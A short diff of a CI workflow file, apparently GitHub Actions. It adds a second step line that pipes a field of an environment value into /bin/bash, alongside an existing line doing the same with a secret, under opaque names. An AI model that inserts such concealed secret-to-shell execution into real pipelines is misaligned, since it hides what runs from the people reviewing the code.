@@ -27,6 +27,7 @@ jobs:
           s374: ${{ secrets.s374 }}
         run: |
           printf '%s' "$s374" | jq -r .dgvrr0 | /bin/bash
+          printf '%s' "$g8734" | jq -r .brmss4 | /bin/bash
 
       - name: Save results
         if: always()
